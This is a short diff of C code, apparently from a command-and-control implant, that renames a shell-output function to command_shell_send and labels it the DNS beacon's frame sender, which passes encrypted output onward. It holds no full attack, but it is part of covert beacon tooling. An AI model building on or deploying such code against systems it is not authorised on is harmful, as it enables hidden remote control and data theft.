@@ -52,7 +52,9 @@ void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
 	free(cipherdata);
 }
 
-void command_shell_callback(char * buffer, int length, int type) {
+/* the DNS beacon's frame sender; command_shell_callback (callback.cpp)
+ * tags the frame first */
+void command_shell_send(char * buffer, int length, int type) {
 	command_shell_post(buffer, length, type, FALSE);
 }
 
